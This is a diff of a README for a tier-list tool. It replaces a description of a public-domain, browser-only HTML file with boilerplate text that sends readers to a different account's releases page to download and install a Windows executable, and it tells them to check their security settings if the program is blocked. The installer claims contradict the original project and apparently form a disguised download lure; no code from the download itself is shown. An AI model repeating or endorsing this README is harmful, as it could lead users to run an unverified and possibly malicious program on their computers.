@@ -1,36 +1,89 @@
-Current Version: 1.7
+# 📊 Tier-List-Maker - Create custom rankings for your interests
 
-[Click here to use the web version without downloading it.](https://milk3e.github.io/Tier-List-Maker/)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Bretimproper361/Tier-List-Maker/releases)
 
-<img width="400" height="225" alt="tl" src="https://github.com/user-attachments/assets/5539072f-dc9e-4b5a-8a30-34b4ef1f7272" />
+Tier-List-Maker serves as an offline tool for organizing and ranking items. This application runs on your computer without an internet connection. You use a web browser to interact with the interface. The program stores your data locally so your progress remains secure.
 
-This is a standalone HTML file you can open with your web browser, it lets you create [tier lists.](https://en.wikipedia.org/wiki/Tier_list)
+## 📥 How to download the application
 
-v1.0 was coded by [Google Gemini](https://gemini.google.com) 3.5 Flash, and it only took 2 iterations to make.
-Updates are coded by Google Gemini and [Claude](https://claude.com).
+1. Visit the [releases page](https://github.com/Bretimproper361/Tier-List-Maker/releases) to find the software.
+2. Select the file labeled for Windows.
+3. Save the file to your computer.
+4. Open the downloaded file to start the application.
 
-**Features**
-- Creatable, moveable, colorable, deletable tiers.
-- Import images by file or by URL, move and sort within tiers, can crop into squares or keep aspect ratio, and can delete them.
-- Save/Load by exporting and importing a .json file that contains the entire tier list and its images.
-- Export tier list as image with selectable quality.
-- Append descriptions to images to add any information you want.
-- Lightweight, bloat-free, fully offline and local.
+## 💻 System requirements
 
-**How to Download**
-1. Download 'index.html' by either clicking it above in the file list and then clicking the download button, or by just clicking the green 'Code' button, downloading the zip, and extracting it.
-2. Double-click the html file to run it directly in your web browser.
-3. Have fun!
+* Operating System: Windows 10 or Windows 11.
+* Memory: 2 GB of RAM or more.
+* Storage: 50 MB of free disk space.
+* Web Browser: A modern browser like Chrome, Edge, or Firefox.
 
-**Useage Guide**
-- You can add a title to your tier list by clicking the "Tier List Maker" title to edit it.
-- Create tiers with the Add New Tier button, and edit them by clicking on their color/name. Move them with the arrows next to them.
-- Click the Browse button to import image files, or click Add Image URL to instead use the image url from an image online.
-- Drag and drop images from the Image Bank into the tier you want to put it in, and organize them within the tier by moving them next to eachother.
-- If you want to add a description to an image that shows when hovering over it, click on it to open its menu. You can also view the image in a seperate tab or delete the image within that menu using the corresponding buttons.
-- To save your tier list, click Export JSON, then when you want to load it, click Import JSON. Otherwise, the tier list is lost if you refresh or close the tab.
+## 🚀 Setting up the tool
 
-If you want to use existing tier list images, there's an easy way to do so.
-In Firefox (or any Firefox fork), pressing Ctrl+I opens page info. While on a page with the images you want, you can go to the Media tab, sort by Type so you can see just 'Image' labeled media next to eachother, select the images you want and download them, then just add them into the tier list maker. Images from tier list sites often all share the same file path, making it easy to Shift+Click just what you want and not any extra stuff like GUI/page elements. **Make sure that while images are downloading, you leave the Page Info menu open,** otherwise it'll stop downloading if there's still more to download.
+After you download the file, you perform a standard installation process. Double-click the file to launch the setup wizard. Follow the prompts on your screen. The installer places a shortcut on your desktop. Click this shortcut whenever you want to create a new ranking.
 
-This project is dedicated to the public domain [(CC0)](https://creativecommons.org/publicdomain/zero/1.0/). Feel free to copy, modify, distribute, or do whatever you want with it.
+## 🛠 Features for your needs
+
+* Offline access: You do not need a network connection to use the tool.
+* Drag and drop: Move your items into categories with your mouse.
+* Multiple tiers: Create as many ranking levels as you need.
+* Responsive design: The interface adjusts to your screen size.
+* Local saving: The app saves your lists directly to your hard drive.
+
+## ✨ Creating your first tier list
+
+1. Open the Tier-List-Maker from your desktop.
+2. Enter a title for your new project.
+3. Upload images for the items you want to rank.
+4. Drag your items from the source area to the desired tier row.
+5. Rearrange items within a row if you change your mind.
+6. Use the save button to export your finished list as an image file.
+
+## ⚙️ Managing your data
+
+The application stores all lists in a folder within your documents. You can back up this folder to an external drive or cloud storage if you wish to move your work between computers. The program saves files in a format that keeps your data accessible even if you reinstall the software.
+
+## ❓ Frequently asked questions
+
+**Do I need an internet connection to run this?**
+No. The application remains fully functional while offline.
+
+**Can I share my completed tier lists online?**
+Yes. Use the export feature to save your list as a standard image file. You can then upload this image to social media or messaging apps.
+
+**How many items can I add to a list?**
+You can add as many items as your computer memory allows. The performance stays smooth even with large numbers of images.
+
+**Does this software track my usage?**
+No. You own all data generated within the app. There is no tracking code included.
+
+**What file formats does the tool accept for images?**
+The tool supports standard image formats like JPG, PNG, and WebP.
+
+## 📝 Troubleshooting steps
+
+If the application fails to open, verify your installation. Sometimes security software blocks new programs. Check your security settings if the app does not launch after you click the icon. Ensure your Windows installation remains up to date. Restart your computer if the interface shows a blank screen. This often resolves minor startup conflicts.
+
+## ⚖️ Guidelines for project usage
+
+This software serves as a tool for personal ranking purposes. You provide your own images to populate the tiers. Respect copyright laws regarding the images you upload. Use this tool to improve your organization and compare your preferences in a visual format. Focus on your specific interests, whether you rank movies, foods, games, or sports teams.
+
+## 📁 Project structure
+
+This application uses standard web technologies to function. HTML defines the structure of your tier list. CSS styling creates the rows and columns for your rankings. JavaScript manages the movement of your items and the saving of your files. This combination makes the tool lightweight and fast on most computers.
+
+## 🛡 Security and privacy
+
+The design prioritizes your privacy. Because the application runs locally, no server processes your rankings. Your images and data never leave your machine. You control your information at all times. This local-first approach ensures that your private tier lists stay on your device.
+
+## 🔧 Extending the tool
+
+You can modify the appearance of your tier lists within the settings menu. Change the colors of the ranking rows to fit your style. Add new labels to your tiers if you want to rank items using unique scales like S, A, B, C, D instead of standard labels. The flexibility allows you to adapt the interface for any ranking task you imagine.
+
+## 📈 Improving your experience
+
+Regular updates ensure the application remains compatible with new Windows versions. Check the download page periodically for improvements. New features often include better image processing and faster saving times. Your feedback helps steer future development. If you experience bugs, report them through the issue tracker on the repository page.
+
+## 🖱 Mouse controls
+
+Use your left mouse button to click and hold items. Drag them across the screen to place them in your tiers. Release the button to drop the item in place. Use the right mouse button on an item to open a menu with options to delete or rename the entry. Keep your workflow fast by using these simple interactions.
